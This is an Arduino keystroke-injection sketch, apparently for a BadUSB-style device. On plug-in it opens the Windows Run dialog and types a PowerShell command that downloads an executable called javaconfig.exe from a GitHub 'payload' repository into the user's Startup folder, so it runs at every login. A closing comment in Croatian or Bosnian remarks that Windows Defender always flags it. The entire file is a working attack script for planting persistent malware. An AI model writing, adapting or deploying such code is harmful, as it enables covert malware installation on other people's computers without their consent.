#include <Keyboard.h>

void setup() {
  delay(2000); // Give time for USB to initialize

  Keyboard.begin();

  // Open Run dialog (Win + R)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();

  delay(500); // Wait for Run box to appear

  // Type PowerShell command
  Keyboard.print("powershell -NoExit -Command \"Invoke-WebRequest 'https://raw.githubusercontent.com/proee948/payload/main/javaconfig.exe' -OutFile \\\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\javaconfig.exe\\\"\"");

  
  Keyboard.press(KEY_RETURN); // Press Enter
  Keyboard.release(KEY_RETURN);

  Keyboard.end(); // Stop keyboard emulation
}

void loop() {
  // Nothing needed here
}
// ovo ce uvijek bit flaggano od defendera!
















